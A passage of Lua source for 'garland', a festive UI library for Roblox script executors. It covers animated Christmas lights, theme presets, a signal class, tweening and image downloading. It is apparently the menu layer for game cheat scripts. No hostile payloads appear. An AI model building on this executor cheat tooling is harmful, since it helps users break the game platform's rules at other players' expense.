--[[
    garland  -  a festive drawing ui library (built on the periastron core)

    what's different from periastron:
      * a garland of glowing christmas lights hanging across the top of the window: the wire
        droops between hooks and the bulbs hang from it, swinging a little. the colors switch
        one bulb along at a time, so the strand looks like it's moving (classic chasing lights)
      * clean, flat look: title bar + vertical sidebar tabs + content panel, section cards,
        switch-style toggles, sliders with a knob, bigger controls, festive theme presets
      * the dog picture at the bottom of the sidebar with the discord invite (click to copy)
        under it - always on. (an optional tilted backdrop word exists too, off by default:
        library.backdrop.enabled = true)
      * centered title + subtitle, tab names, section titles and sidebar footer
      * uses the game's normal mouse while the menu is open (no drawn cursor)

    same api as periastron (library:init, NewWindow, AddTab, AddSection, AddToggle, ...),
    so existing scripts keep working. players can only change the light colors and direction
    (add them to any section with library:AddLightControls); the fixed look lives in library.lights,
    library.backdrop, library.mascot and library.discord.
]]

-- // Load

local startupArgs = ({...})[1] or {}

if getgenv().library ~= nil and type(getgenv().library.Unload) == 'function' then
    pcall(function()
        getgenv().library:Unload();
    end)
end

if not game:IsLoaded() then
    game.Loaded:Wait()
end

local function gs(a)
    return game:GetService(a)
end

-- // Variables
local players, http, runservice, inputservice, tweenService, stats, actionservice = gs('Players'), gs('HttpService'), gs('RunService'), gs('UserInputService'), gs('TweenService'), gs('Stats'), gs('ContextActionService')
local localplayer = players.LocalPlayer

local setByConfig = false
local floor, ceil, huge, pi, clamp = math.floor, math.ceil, math.huge, math.pi, math.clamp
local c3new, fromrgb, fromhsv = Color3.new, Color3.fromRGB, Color3.fromHSV
local next, newInstance, newUDim2, newVector2 = next, Instance.new, UDim2.new, Vector2.new
local isexecutorclosure = isexecutorclosure or is_synapse_function or is_sirhurt_closure or iskrnlclosure;
local executor = (
    syn and 'syn' or
    (identifyexecutor and identifyexecutor()) or
    (getexecutorname and getexecutorname()) or
    'unknown'
)

-- // Pointer: the mouse on pc, the finger on phones / tablets.
-- every place that needs "where is the cursor" calls getPointer(), so touch works everywhere.
local guiservice = gs('GuiService')
local pointer = {
    touch = false,  -- true after the last input was a touch
    pos = nil,      -- screen position of the finger (same space as the mouse / Drawing objects)
    active = nil,   -- the touch InputObject currently pressing the menu (only one finger counts)
}

-- touch positions don't include the top bar inset, mouse / Drawing positions do
local function touchToScreen(input)
    local inset = newVector2(0, 0)
    pcall(function()
        inset = guiservice:GetGuiInset()
    end)
    return newVector2(input.Position.X, input.Position.Y) + inset
end

local function getPointer()
    if pointer.touch and pointer.pos then
        return pointer.pos
    end
    return inputservice.GetMouseLocation(inputservice)
end

-- phones / tablets (touch screen and no mouse)
local isMobile = false
pcall(function()
    isMobile = inputservice.TouchEnabled and not inputservice.MouseEnabled
end)

-- // Executor compatibility helpers
-- The original lib relied on Synapse-only globals (syn.request, syn.crypt, syn.protect_gui, printconsole)
-- which error on every other executor. These fall back gracefully.

-- size + position of a slider's fill bar. ranges that cross 0 (like -50..50) fill from the 0 point
-- towards the value, so the bar never gets a negative width (that's what made it spill past the end)
local function sliderFill(min, max, value)
    local range = max - min
    if range <= 0 then
        return UDim2.new(1, 0, 1, 0), UDim2.new(0, 0, 0, 0)
    end
    local zero = math.clamp((0 - min) / range, 0, 1)
    local point = math.clamp((value - min) / range, 0, 1)
    local left = math.min(zero, point)
    return UDim2.new(math.abs(point - zero), 0, 1, 0), UDim2.new(left, 0, 0, 0)
end

-- snaps a value to the nearest increment (the old floor() turned 0.5 with increment 0.1 into 0.4)
local function snapToIncrement(value, increment, min, max)
    increment = (typeof(increment) == 'number' and increment > 0) and increment or 1
    local snapped = math.floor(value / increment + 0.5) * increment
    -- strip float noise like 0.30000000000000004
    snapped = tonumber(string.format('%.10f', snapped)) or snapped
    return math.clamp(snapped, min, max)
end

local function log(msg)
    if printconsole then
        pcall(printconsole, tostring(msg), 255, 0, 0)
    else
        warn('[ui] ' .. tostring(msg))
    end
end

-- note: the local `http` above is HttpService, so the executor `http` table is read from getgenv
local genvHttp = getgenv and rawget(getgenv(), 'http')
local httpRequest = (syn and syn.request) or (type(genvHttp) == 'table' and genvHttp.request) or http_request or (fluxus and fluxus.request) or request

local nativeSetClipboard = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)
local function setclip(str)
    if nativeSetClipboard then
        pcall(nativeSetClipboard, tostring(str))
        return true
    end
    log('setclipboard is not supported by this executor')
    return false
end

local function safeMakeFolder(path)
    if makefolder and not (isfolder and isfolder(path)) then
        pcall(makefolder, path)
    end
end

local base64decode
do
    local native = (crypt and (crypt.base64decode or (crypt.base64 and crypt.base64.decode)))
        or (syn and syn.crypt and syn.crypt.base64 and syn.crypt.base64.decode)
        or base64_decode
        or (base64 and base64.decode)

    local chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local lookup = {}
    for i = 1, #chars do
        lookup[chars:sub(i, i)] = i - 1
    end

    -- pure lua fallback
    local function luaDecode(data)
        data = data:gsub('[^%w%+/=]', '')
        local out = {}
        local bits, bitCount = 0, 0
        for i = 1, #data do
            local ch = data:sub(i, i)
            if ch == '=' then break end
            local v = lookup[ch]
            if v then
                bits = bits * 64 + v
                bitCount = bitCount + 6
                if bitCount >= 8 then
                    bitCount = bitCount - 8
                    local byte = math.floor(bits / (2 ^ bitCount)) % 256
                    out[#out + 1] = string.char(byte)
                    bits = bits % (2 ^ bitCount)
                end
            end
        end
        return table.concat(out)
    end

    base64decode = function(data)
        if native then
            local ok, res = pcall(native, data)
            if ok and type(res) == 'string' and #res > 0 then
                return res
            end
        end
        return luaDecode(data)
    end
end

-- // Signal
-- The original loaded Quenty's Nevermore Signal.lua from GitHub. That file now calls
-- require(script.Parent.loader), which errors under loadstring, so the whole lib failed to load.
-- This is a small self-contained replacement with the same API (new/Connect/Fire/Wait/Once/DisconnectAll).
local Signal = {}
Signal.__index = Signal
do
    local Connection = {}
    Connection.__index = Connection

    function Connection:Disconnect()
        if not self.Connected then return end
        self.Connected = false
        local handlers = self._signal._handlers
        local idx = table.find(handlers, self)
        if idx then
            table.remove(handlers, idx)
        end
    end
    Connection.Destroy = Connection.Disconnect

    function Signal.new()
        return setmetatable({_handlers = {}}, Signal)
    end

    function Signal:Connect(fn)
        assert(type(fn) == 'function', 'Signal:Connect expects a function')
        local conn = setmetatable({_signal = self, _fn = fn, Connected = true}, Connection)
        table.insert(self._handlers, conn)
        return conn
    end

    function Signal:Once(fn)
        local conn
        conn = self:Connect(function(...)
            conn:Disconnect()
            fn(...)
        end)
        return conn
    end

    -- handlers run in a reused coroutine (GoodSignal style) instead of a brand new thread per handler per fire.
    -- a handler that yields simply keeps that coroutine, and a new one is made for the next handler.
    local freeRunner = nil
    local function acquireRunnerAndCall(fn, ...)
        local runner = freeRunner
        freeRunner = nil
        fn(...)
        freeRunner = runner
    end
    local function runEventHandlerInFreeThread()
        while true do
            acquireRunnerAndCall(coroutine.yield())
        end
    end

    function Signal:Fire(...)
        local handlers = self._handlers
        if #handlers == 0 then return end
        -- copy so handlers can disconnect while firing
        for _, conn in ipairs(table.clone(handlers)) do
            if conn.Connected then
                if not freeRunner then
                    freeRunner = coroutine.create(runEventHandlerInFreeThread)
                    coroutine.resume(freeRunner)
                end
                task.spawn(freeRunner, conn._fn, ...)
            end
        end
    end

    function Signal:Wait()
        local thread = coroutine.running()
        self:Once(function(...)
            task.spawn(thread, ...)
        end)
        return coroutine.yield()
    end

    function Signal:DisconnectAll()
        for _, conn in ipairs(table.clone(self._handlers)) do
            conn:Disconnect()
        end
    end
    Signal.Destroy = Signal.DisconnectAll
end

local library = {
    windows = {};
    indicators = {};
    flags = {};
    options = {};
    connections = {};
    drawings = {};
    instances = {};
    utility = {};
    notifications = {};
    tweens = {};
    activeTweens = {};
    hitboxes = {}; -- visible-or-not Squares that can be hovered/clicked (drawing data -> true)
    theme = {};
    zindexOrder = {
        ['indicator'] = 950;
        ['window'] = 1000;
        ['dropdown'] = 1200;
        ['colorpicker'] = 1100;
        ['watermark'] = 1300;
        ['notification'] = 1400;
        ['cursor'] = 1500;
    },
    stats = {
        ['fps'] = 0;
        ['ping'] = 0;
    };
    images = {
        ['gradientp90'] = 'https://raw.githubusercontent.com/portallol/luna/main/modules/gradient90.png';
        ['gradientp45'] = 'https://raw.githubusercontent.com/portallol/luna/main/modules/gradient45.png';
        ['colorhue'] = 'https://raw.githubusercontent.com/portallol/luna/main/modules/lgbtqshit.png';
        ['colortrans'] = 'https://raw.githubusercontent.com/portallol/luna/main/modules/trans.png';
    };
    -- keys accepted when ctrl+clicking a slider to type a number (numpad, minus and decimal point included)
    numberStrings = {
        ['Zero'] = 0, ['One'] = 1, ['Two'] = 2, ['Three'] = 3, ['Four'] = 4, ['Five'] = 5, ['Six'] = 6, ['Seven'] = 7, ['Eight'] = 8, ['Nine'] = 9,
        ['KeypadZero'] = 0, ['KeypadOne'] = 1, ['KeypadTwo'] = 2, ['KeypadThree'] = 3, ['KeypadFour'] = 4,
        ['KeypadFive'] = 5, ['KeypadSix'] = 6, ['KeypadSeven'] = 7, ['KeypadEight'] = 8, ['KeypadNine'] = 9,
        ['Minus'] = '-', ['KeypadMinus'] = '-', ['Period'] = '.', ['KeypadPeriod'] = '.',
    };
    signal = Signal;
    open = false;
    opening = false;
    hasInit = false;
    cheatname = startupArgs.cheatname or 'garland';
    gamename = startupArgs.gamename or 'universal';
    fileext = startupArgs.fileext or '.txt';
}

-- Fetches a Twemoji PNG by codepoint (e.g. '1f3e0') for use as a tab icon.
-- Cached; returns the raw PNG bytes or nil if it couldn't be downloaded.
do
    local iconCache = {}
    function library.IconPNG(cp)
        if iconCache[cp] ~= nil then
            return iconCache[cp] or nil
        end
        local url = 'https://cdn.jsdelivr.net/gh/twitter/twemoji@latest/assets/72x72/' .. tostring(cp) .. '.png'
        local ok, data = pcall(function() return game:HttpGet(url) end)
        local valid = (ok and type(data) == 'string' and data:sub(1, 4) == '\137PNG') and data or false
        iconCache[cp] = valid
        return valid or nil
    end
end

-- animation timings (seconds). set any of these to 0 to turn that animation off
library.animations = {
    enabled = true;   -- master switch
    color = .12;      -- hover / toggle / tab color easing
    tab = .22;        -- tab switch fade + rise
    tabOffset = 6;    -- how many pixels sections rise when switching tabs
    popup = .16;      -- dropdown / color picker open
    popupOffset = 4;
    window = .22;     -- menu open rise
    windowOffset = 8;
    indicator = .25;  -- sliding tab underline
}

-- // String lights: a garland hanging across the top of the window. always on.
-- the only things players can change are the colors and the direction (library:AddLightControls);
-- everything else here is the fixed look, tweak it in code if you want.
library.lights = {
    enabled = true;       -- always on (kept for the drawing code, not exposed in the menu)
    palette = 'frost';    -- classic, tree, warm, frost, candy, theme, rainbow (see library.lightPalettes)
    colorStep = .55;      -- seconds between the colors switching one bulb along (this is what makes it look like it moves)
    reverse = false;      -- run the colors the other way
    swag = 84;            -- width of one drape of wire, hook to hook (pixels)
    sag = 9;              -- how deep each drape hangs
    perSwag = 3;          -- bulbs on each drape
    bulbSize = 3.2;       -- bulb radius in pixels
    sway = 1;             -- how much the bulbs swing (0 = still)
    glow = 1;             -- glow strength (0 = no glow, 2 = very bright)
    twinkle = .15;        -- random flicker per bulb (0 - 1)
    shadow = true;        -- soft drop shadow under the window
    powerOn = .8;         -- seconds for the bulbs to switch on one after another when the menu opens (0 = instant)
    fps = 40;             -- how often the lights update (lower = cheaper)
}

-- bulb colors, used in order along the strand.
-- 'theme' (shades of the accent color) and 'rainbow' (six hues) are generated on the fly.
library.lightPalettes = {
    classic = {fromrgb(255,58,58), fromrgb(60,220,95), fromrgb(255,196,48), fromrgb(64,140,255), fromrgb(236,88,255)};
    tree    = {fromrgb(255,58,58), fromrgb(60,220,95), fromrgb(255,210,80)};
    warm    = {fromrgb(255,214,140), fromrgb(255,184,92), fromrgb(255,236,190), fromrgb(255,160,70)};
    frost   = {fromrgb(120,200,255), fromrgb(225,245,255), fromrgb(80,150,255), fromrgb(170,225,255)};
    candy   = {fromrgb(255,50,70), fromrgb(255,245,245)};
}
library.lightPaletteNames = {'classic', 'tree', 'warm', 'frost', 'candy', 'theme', 'rainbow'}

-- // Backdrop: a big tilted word on the content panel, behind the sections. OFF by default;
-- set library.backdrop.enabled = true (before creating the window, or any time) to show it.
library.backdrop = {
    enabled = false;      -- hidden unless you turn it on in code
    text = 'swag';        -- letters available: see library.backdropGlyphs (add your own there)
    angle = 30;           -- degrees, rising from bottom left to top right
    opacity = .09;        -- how strongly it shows (0 = invisible, 1 = full accent color)
    color = 'Accent';     -- theme color it's tinted with
    size = .8;            -- how much of the content panel it fills (0 - 1)
    weight = .17;         -- stroke thickness, relative to the letter height
}

-- // Mascot: the dog picture at the bottom of the sidebar. always shown.
library.mascot = {
    id = 6500411559;      -- the dog (a Roblox decal id)
    size = 84;            -- pixels (square)
}

-- // Discord invite shown at the bottom of the sidebar (click it to copy) and used by the Settings buttons
library.discord = 'discord.gg/privateworld'

-- Downloads a Roblox decal/image as PNG bytes for Drawing images (Drawing can't use rbxassetid://).
-- Uses the public thumbnails api (no login needed), caches to <cheatname>/assets/rbx_<id>.png.
-- Returns the bytes, or nil if it couldn't be loaded. Yields, so call it from a thread.
do
    local cache = {}
    local function isImage(data)
        return type(data) == 'string' and (data:sub(1, 4) == '\137PNG' or data:sub(1, 3) == '\255\216\255')
    end
    function library.RobloxImage(id, size)
        id = tonumber(id)
        if not id then return nil end
        size = size or 420
        local key = id .. '_' .. size
        if cache[key] ~= nil then
            return cache[key] or nil
        end

        local path = library.cheatname .. '/assets/rbx_' .. key .. '.png'
        if isfile and readfile then
            local ok, cached = pcall(function() return isfile(path) and readfile(path) end)
            if ok and isImage(cached) then
                cache[key] = cached
                return cached
            end
        end

        local data
        pcall(function()
            local api = ('https://thumbnails.roblox.com/v1/assets?assetIds=%d&returnPolicy=PlaceHolder&size=%dx%d&format=Png&isCircular=false'):format(id, size, size)
            local info = http:JSONDecode(game:HttpGet(api))
            local url = info and info.data and info.data[1] and info.data[1].imageUrl
            if url then
                data = game:HttpGet(url)
            end
        end)

        if isImage(data) then
            cache[key] = data
            if writefile then
                pcall(safeMakeFolder, library.cheatname)
                pcall(safeMakeFolder, library.cheatname .. '/assets')
                pcall(writefile, path, data)
            end
            return data
        end
        cache[key] = false
        log('could not load roblox image ' .. tostring(id))
        return nil
    end
end

-- letter shapes for the backdrop, as strokes in "em" units: x to the right, y up from the baseline,
-- 1 = lowercase letter height (descenders go below 0). each glyph has a width and a list of strokes;
-- a stroke is either {'line', {x,y}, {x,y}, ...} or {'arc', cx, cy, rx, ry, fromDeg, toDeg}.
library.backdropGlyphs = {
    s = {width = .56, strokes = {
        {'arc', .28, .75, .27, .25, 25, 270},
        {'arc', .28, .25, .27, .25, 90, -155},
    }},
    w = {width = .8, strokes = {
        {'line', {0, 1}, {.2, 0}, {.4, .72}, {.6, 0}, {.8, 1}},
    }},
    a = {width = .6, strokes = {
        {'arc', .3, .5, .3, .5, 0, 360},
        {'line', {.6, 1}, {.6, 0}},
    }},
    g = {width = .6, strokes = {
        {'arc', .3, .5, .3, .5, 0, 360},
        {'line', {.6, 1}, {.6, -.15}},
        {'arc', .3, -.15, .3, .3, 0, -160},
    }},
    [' '] = {width = .4, strokes = {}},
}

library.themes = {
    {
        name = 'Evergreen',
        theme = {
            ['Accent']                    = fromrgb(120,196,255); -- frost blue, same as the frost lights
            ['Background']                = fromrgb(13,20,16);
            ['Border']                    = fromrgb(0,0,0);
            ['Border 1']                  = fromrgb(44,66,52);
            ['Border 2']                  = fromrgb(19,29,23);
            ['Border 3']                  = fromrgb(5,9,7);
            ['Primary Text']              = fromrgb(242,238,228);
            ['Title Background']          = fromrgb(17,27,21);
            ['Sidebar Background']        = fromrgb(15,23,18);
            ['Group Background']          = fromrgb(11,17,14);
            ['Selected Tab Background']   = fromrgb(30,46,36);
            ['Unselected Tab Background'] = fromrgb(15,23,18);
            ['Selected Tab Text']         = fromrgb(255,250,240);
            ['Unselected Tab Text']       = fromrgb(132,156,141);
            ['Section Background']        = fromrgb(17,27,21);
            ['Option Text 1']             = fromrgb(246,243,236);
            ['Option Text 2']             = fromrgb(204,208,200);
            ['Option Text 3']             = fromrgb(140,158,147);
            ['Option Border 1']           = fromrgb(46,70,55);
            ['Option Border 2']           = fromrgb(4,8,6);
            ['Option Background']         = fromrgb(27,41,32);
            ['Risky Text']                = fromrgb(175,21,21);
            ['Risky Text Enabled']        = fromrgb(255,41,41);
        }
    },
    {
        name = 'Candy Cane',
        theme = {
            ['Accent']                    = fromrgb(240,58,82);
            ['Background']                = fromrgb(20,14,16);
            ['Border']                    = fromrgb(0,0,0);
            ['Border 1']                  = fromrgb(74,46,52);
            ['Border 2']                  = fromrgb(30,20,23);
            ['Border 3']                  = fromrgb(8,5,6);
            ['Primary Text']              = fromrgb(250,242,244);
            ['Title Background']          = fromrgb(28,19,22);
            ['Sidebar Background']        = fromrgb(24,16,19);
            ['Group Background']          = fromrgb(15,10,12);
            ['Selected Tab Background']   = fromrgb(46,30,35);
            ['Unselected Tab Background'] = fromrgb(24,16,19);
            ['Selected Tab Text']         = fromrgb(255,248,248);
            ['Unselected Tab Text']       = fromrgb(170,140,146);
            ['Section Background']        = fromrgb(26,18,21);
            ['Option Text 1']             = fromrgb(252,246,247);
            ['Option Text 2']             = fromrgb(214,200,203);
            ['Option Text 3']             = fromrgb(162,140,145);
            ['Option Border 1']           = fromrgb(76,48,55);
            ['Option Border 2']           = fromrgb(6,4,5);
            ['Option Background']         = fromrgb(40,27,31);
            ['Risky Text']                = fromrgb(175,21,21);
            ['Risky Text Enabled']        = fromrgb(255,41,41);
        }
    },
    {
        name = 'Frostbite',
        theme = {
            ['Accent']                    = fromrgb(120,196,255);
            ['Background']                = fromrgb(11,15,24);
            ['Border']                    = fromrgb(0,0,0);
            ['Border 1']                  = fromrgb(44,58,84);
            ['Border 2']                  = fromrgb(18,24,38);
            ['Border 3']                  = fromrgb(4,6,10);
            ['Primary Text']              = fromrgb(236,244,255);
            ['Title Background']          = fromrgb(16,22,35);
            ['Sidebar Background']        = fromrgb(13,18,29);
            ['Group Background']          = fromrgb(9,12,20);
            ['Selected Tab Background']   = fromrgb(28,38,60);
            ['Unselected Tab Background'] = fromrgb(13,18,29);
            ['Selected Tab Text']         = fromrgb(240,248,255);
            ['Unselected Tab Text']       = fromrgb(130,148,176);
            ['Section Background']        = fromrgb(15,21,33);
            ['Option Text 1']             = fromrgb(242,248,255);
            ['Option Text 2']             = fromrgb(198,210,228);
            ['Option Text 3']             = fromrgb(136,152,178);
            ['Option Border 1']           = fromrgb(46,62,90);
            ['Option Border 2']           = fromrgb(3,5,9);
            ['Option Background']         = fromrgb(24,33,52);
            ['Risky Text']                = fromrgb(175,21,21);
            ['Risky Text Enabled']        = fromrgb(255,41,41);
        }
    },
    {
        name = 'Gingerbread',
        theme = {
            ['Accent']                    = fromrgb(236,152,74);
            ['Background']                = fromrgb(22,16,12);
            ['Border']                    = fromrgb(0,0,0);
            ['Border 1']                  = fromrgb(72,54,40);
            ['Border 2']                  = fromrgb(32,23,17);
            ['Border 3']                  = fromrgb(8,6,4);
            ['Primary Text']              = fromrgb(252,242,228);
            ['Title Background']          = fromrgb(31,22,16);
            ['Sidebar Background']        = fromrgb(26,19,14);
            ['Group Background']          = fromrgb(17,12,9);
            ['Selected Tab Background']   = fromrgb(50,36,26);
            ['Unselected Tab Background'] = fromrgb(26,19,14);
            ['Selected Tab Text']         = fromrgb(255,246,234);
            ['Unselected Tab Text']       = fromrgb(172,148,128);
            ['Section Background']        = fromrgb(29,21,15);
            ['Option Text 1']             = fromrgb(252,244,234);
            ['Option Text 2']             = fromrgb(214,200,184);
            ['Option Text 3']             = fromrgb(166,146,128);
            ['Option Border 1']           = fromrgb(76,57,42);
            ['Option Border 2']           = fromrgb(6,4,3);
            ['Option Background']         = fromrgb(44,32,23);
            ['Risky Text']                = fromrgb(175,21,21);
            ['Risky Text Enabled']        = fromrgb(255,41,41);
        }
    },
    {
        name = 'Silent Night',
        theme = {
            ['Accent']                    = fromrgb(255,204,92);
            ['Background']                = fromrgb(12,12,22);
            ['Border']                    = fromrgb(0,0,0);
            ['Border 1']                  = fromrgb(48,48,78);
            ['Border 2']                  = fromrgb(20,20,36);
            ['Border 3']                  = fromrgb(5,5,10);
            ['Primary Text']              = fromrgb(246,242,228);
            ['Title Background']          = fromrgb(18,18,32);
            ['Sidebar Background']        = fromrgb(15,15,27);
            ['Group Background']          = fromrgb(9,9,17);
            ['Selected Tab Background']   = fromrgb(32,32,56);
            ['Unselected Tab Background'] = fromrgb(15,15,27);
            ['Selected Tab Text']         = fromrgb(255,250,232);
            ['Unselected Tab Text']       = fromrgb(142,142,176);
            ['Section Background']        = fromrgb(17,17,30);
            ['Option Text 1']             = fromrgb(248,246,236);
            ['Option Text 2']             = fromrgb(206,204,214);
            ['Option Text 3']             = fromrgb(146,146,174);
            ['Option Border 1']           = fromrgb(50,50,82);
            ['Option Border 2']           = fromrgb(4,4,8);
            ['Option Background']         = fromrgb(27,27,46);
            ['Risky Text']                = fromrgb(175,21,21);
            ['Risky Text Enabled']        = fromrgb(255,41,41);
        }
    },
    {
        name = 'Aurora',
        theme = {
            ['Accent']                    = fromrgb(140,110,255);
            ['Background']                = fromrgb(13,12,22);
            ['Border']                    = fromrgb(0,0,0);
            ['Border 1']                  = fromrgb(52,46,84);
            ['Border 2']                  = fromrgb(22,20,38);
            ['Border 3']                  = fromrgb(5,4,10);
            ['Primary Text']              = fromrgb(242,240,252);
            ['Title Background']          = fromrgb(19,17,33);
            ['Sidebar Background']        = fromrgb(16,14,28);
            ['Group Background']          = fromrgb(10,9,18);
            ['Selected Tab Background']   = fromrgb(34,30,60);
            ['Unselected Tab Background'] = fromrgb(16,14,28);
            ['Selected Tab Text']         = fromrgb(246,242,255);
            ['Unselected Tab Text']       = fromrgb(150,140,182);
            ['Section Background']        = fromrgb(18,16,31);
            ['Option Text 1']             = fromrgb(246,244,255);
            ['Option Text 2']             = fromrgb(206,202,224);
            ['Option Text 3']             = fromrgb(150,144,180);
            ['Option Border 1']           = fromrgb(54,48,88);
            ['Option Border 2']           = fromrgb(4,3,8);
            ['Option Background']         = fromrgb(29,26,50);
            ['Risky Text']                = fromrgb(175,21,21);
            ['Risky Text Enabled']        = fromrgb(255,41,41);
        }
    }
}

local blacklistedKeys = {
    Enum.KeyCode.Unknown,
    Enum.KeyCode.W,
    Enum.KeyCode.A,
    Enum.KeyCode.S,
    Enum.KeyCode.D,
    Enum.KeyCode.Slash,
    Enum.KeyCode.Tab,
    Enum.KeyCode.Escape
}

local whitelistedBoxKeys = {
    Enum.KeyCode.Zero,
    Enum.KeyCode.One,
    Enum.KeyCode.Two,
    Enum.KeyCode.Three,
    Enum.KeyCode.Four,
    Enum.KeyCode.Five,
    Enum.KeyCode.Six,
    Enum.KeyCode.Seven,
    Enum.KeyCode.Eight,
    Enum.KeyCode.Nine
}

local keyNames = {
    [Enum.KeyCode.LeftControl] = 'LCTRL';
    [Enum.KeyCode.RightControl] = 'RCTRL';
    [Enum.KeyCode.LeftShift] = 'LSHIFT';
    [Enum.KeyCode.RightShift] = 'RSHIFT';
    [Enum.UserInputType.MouseButton1] = 'MB1';
    [Enum.UserInputType.MouseButton2] = 'MB2';
    [Enum.UserInputType.MouseButton3] = 'MB3';
}

-- display name for a bind ('none' / nil / false -> 'none')
local function getKeyName(key)
    if typeof(key) == 'EnumItem' then
        return keyNames[key] or key.Name
    end
    return 'none'
end

-- turns an InputObject into a bind value; returns false for blacklisted keys (= cancel)
local function getInputKey(inp, nomouse)
    local mouseButtons = {Enum.UserInputType.MouseButton1, Enum.UserInputType.MouseButton2, Enum.UserInputType.MouseButton3}
    if table.find(mouseButtons, inp.UserInputType) then
        return (not nomouse) and inp.UserInputType or false
    end
    if inp.UserInputType == Enum.UserInputType.Keyboard then
        if inp.KeyCode == Enum.KeyCode.Backspace then
            return 'none'
        end
        if not table.find(blacklistedKeys, inp.KeyCode) then
            return inp.KeyCode
        end
    end
    return false
end

library.button1down = library.signal.new()
library.button1up   = library.signal.new()
library.mousemove   = library.signal.new()
library.unloaded    = library.signal.new();

local button1down, button1up, mousemove = library.button1down, library.button1up, library.mousemove
local mb1down = false;

local utility = library.utility
do

    function utility:Connection(signal, func)
        local c = signal:Connect(func)
        table.insert(library.connections, c)
        return c
    end

    function utility:Instance(class, properties)
        local inst = newInstance(class)
        for prop, val in next, properties or {} do
            local s,e = pcall(function()
                inst[prop] = val
            end)
            if not s then
                log(e)
            end
        end
        return inst
    end

    function utility:HasProperty(obj, prop)
        return ({(pcall(function() local a = obj[prop] end))})[1]
    end

    function utility:ToRGB(c3)
        return c3.R*255,c3.G*255,c3.B*255
    end

    function utility:AddRGB(a,b)
        local r1,g1,b1 = self:ToRGB(a);
        local r2,g2,b2 = self:ToRGB(b);
        return fromrgb(clamp(r1+r2,0,255),clamp(g1+g2,0,255),clamp(b1+b2,0,255))
    end

    function utility:ConvertNumberRange(val,oldmin,oldmax,newmin,newmax)
        return (((val - oldmin) * (newmax - newmin)) / (oldmax - oldmin)) + newmin
    end

    function utility:UDim2ToVector2(udim2, vector2)
        local x,y
        x = udim2.X.Offset + self:ConvertNumberRange(udim2.X.Scale,0,1,0,vector2.X)
        y = udim2.Y.Offset + self:ConvertNumberRange(udim2.Y.Scale,0,1,0,vector2.Y)
        return newVector2(x,y)
    end

    function utility:Lerp(a,b,c)
        return a + (b-a) * c
    end

    function utility:Tween(obj, prop, val, time, direction, style)
        if self:HasProperty(obj, prop) then
            if library.tweens[obj] then
                if library.tweens[obj][prop] then
                    library.tweens[obj][prop]:Cancel()
                end
            end

            local startVal = obj[prop];
            local a = 0;
            local tween = {
                Completed = library.signal.new();
            };

            library.tweens[obj] = library.tweens[obj] or {};
            library.tweens[obj][prop] = tween;

            local finished = false
            local isNumber = typeof(startVal) == 'number'
            style = style or Enum.EasingStyle.Linear
            direction = direction or Enum.EasingDirection.In

            function tween:Cancel()
                if finished then return end
                finished = true
                library.activeTweens[tween] = nil
                local completed = tween.Completed
                if library.tweens[obj] and library.tweens[obj][prop] == tween then
                    library.tweens[obj][prop] = nil;
                end
                completed:Fire();
            end

            -- called by the shared tween loop (see utility:StepTweens)
            function tween:Step(dt)
                if finished then return end
                a = (time and time > 0) and (a + (dt / time)) or 1;
                local alpha = a < 1 and a or 1
                local progress = tweenService:GetValue(alpha, style, direction)
                local ok = pcall(function()
                    if isNumber then
                        obj[prop] = startVal + (val - startVal) * progress;
                    else
                        obj[prop] = startVal:Lerp(val, progress);
                    end
                end)
                if a >= 1 or not ok then
                    tween:Cancel();
                end
            end

            library.activeTweens[tween] = true
            return tween;
        else
            log('unable to tween: invalid property '..tostring(prop)..' for object '..tostring(obj))
        end
    end

    -- one RenderStepped connection drives every running tween (connected in library:init)
    function utility:StepTweens(dt)
        if next(library.activeTweens) == nil then return end
        local list = {}
        for tween in next, library.activeTweens do
            list[#list + 1] = tween
        end
        for i = 1, #list do
            list[i]:Step(dt)
        end
    end

    function utility:DetectTableChange(indexcallback,newindexcallback)
        if indexcallback == nil then
            warn('DetectTableChange: Argument #1 (indexcallback) is nil, function may not work as expected.')
        elseif newindexcallback == nil then
            warn('DetectTableChange: Argument #2 (newindexcallback) is nil, function may not work as expected.')
        end
        local proxy = newproxy(true);
        local mt = getmetatable(proxy);
        mt.__index = indexcallback
        mt.__newindex = newindexcallback
        return proxy
    end

    -- animTime > 0 eases the color (used for hover / toggle / tab changes); theme changes stay instant
    function utility:ApplyThemeColor(v, animTime)
        if v == nil or v.Object == nil then return end
        local offset = tonumber(v.ThemeColorOffset) or 0
        local outlineOffset = tonumber(v.OutlineThemeColorOffset) or 0
        if v.ThemeColor and v.ThemeColor ~= '' and library.theme[v.ThemeColor] then
            local target = utility:AddRGB(library.theme[v.ThemeColor], fromrgb(offset, offset, offset))
            local running = library.tweens[v.Object] and library.tweens[v.Object].Color
            local animate = library.animations.enabled and typeof(animTime) == 'number' and animTime > 0 and v.AbsVisible

            if animate then
                utility:Tween(v.Object, 'Color', target, animTime, Enum.EasingDirection.Out, Enum.EasingStyle.Quad)
            else
                if running then
                    running:Cancel()
                end
                pcall(function()
                    v.Object.Color = target
                end)
            end
        end
        if v.OutlineThemeColor and v.OutlineThemeColor ~= '' and library.theme[v.OutlineThemeColor] then
            pcall(function()
                v.Object.OutlineColor = utility:AddRGB(library.theme[v.OutlineThemeColor], fromrgb(outlineOffset, outlineOffset, outlineOffset))
            end)
        end
    end

    -- // Animation helpers

    -- the "real" transparency of an object, even if a fade is currently running on it
    local restingTransparency = setmetatable({}, {__mode = 'k'})
    function utility:GetRestingTransparency(obj)
        local running = library.tweens[obj] and library.tweens[obj].Transparency
        if running and restingTransparency[obj] ~= nil then
            return restingTransparency[obj]
        end
        return obj.Transparency
    end

    -- call right after starting a Transparency tween on obj, so other animations know its real value
    function utility:SetRestingTransparency(obj, value)
        restingTransparency[obj] = value
    end

    -- fades a drawing and all its descendants in from invisible to their normal transparency
    function utility:FadeIn(root, duration)
        if not library.animations.enabled or not duration or duration <= 0 then return end
        local rootData = root and root.Object and library.drawings[root.Object]
        if not rootData then return end

        local list = rootData:GetDescendants()
        table.insert(list, rootData)

        for _, d in next, list do
            local obj = d.Object
            if obj ~= nil then
                local target = utility:GetRestingTransparency(obj)
                if target ~= 0 then -- 0 = invisible hit areas, leave them alone
                    obj.Transparency = 0
                    utility:Tween(obj, 'Transparency', target, duration, Enum.EasingDirection.Out, Enum.EasingStyle.Quad)
                    restingTransparency[obj] = target -- set after Tween() so the cancelled tween can't clear it
                end
            end
        end
    end

    -- eases a drawing's Position from (target + offset) to target
    function utility:SlideIn(drawing, target, offset, duration)
